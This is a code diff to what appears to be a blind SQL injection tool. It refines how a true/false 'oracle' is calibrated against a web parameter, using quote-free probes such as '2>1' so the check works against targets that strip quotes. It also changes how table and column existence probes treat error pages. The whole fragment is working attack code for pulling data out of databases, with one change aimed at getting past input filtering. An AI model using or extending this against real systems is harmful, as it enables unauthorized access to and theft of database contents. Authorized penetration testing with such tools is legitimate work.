@@ -186,12 +186,14 @@ def calibrate(http, url, param, value, console=None):
             threshold = min(0.95, (1.0 + signal) / 2)
             o = Oracle(http, url, param, value, tmpl, context, t1, f,
                        threshold=threshold, console=console)
-            # Confirm with two textually-distinct true/false pairs. A real oracle
+            # Confirm with two structurally-distinct true/false pairs. A real oracle
             # answers by *meaning*, so both true forms land on the TRUE page; a page
             # that merely reflects the payload text would not, so this rejects a
-            # reflected `1=1`/`1=2` masquerading as an oracle.
+            # reflected `1=1`/`1=2` masquerading as an oracle. The pairs are
+            # quote-free on purpose, so the check still works against a target that
+            # strips quotes from input.
             if (o.ask("1=1") and not o.ask("1=2")
-                    and o.ask("'q'='q'") and not o.ask("'q'='r'")):
+                    and o.ask("2>1") and not o.ask("2<1")):
                 o.blocked = 0                        # calibration probes don't count
                 return o
     return None
@@ -381,8 +383,17 @@ _COMMON_COLUMNS = [
 
 
 def _exists(oracle, expr) -> bool:
-    """True if `expr` runs without error — i.e. the table/column is really there."""
-    return oracle.ask(f"({expr})>=0")
+    """True if `expr` runs without error — i.e. the table/column is really there.
+
+    A probe for something that isn't there usually errors, which renders as an
+    *anomalous* page (a third state, close to neither the TRUE nor the FALSE
+    calibration) rather than a clean false. The relative bit decision can tie that
+    to True, so we treat any anomaly raised during the probe as "doesn't exist"."""
+    before = getattr(oracle, "blocked", 0)
+    ans = oracle.ask(f"({expr})>=0")
+    if getattr(oracle, "blocked", 0) > before:
+        return False
+    return ans
 
 
 def common_tables(oracle, names=None, db=None):
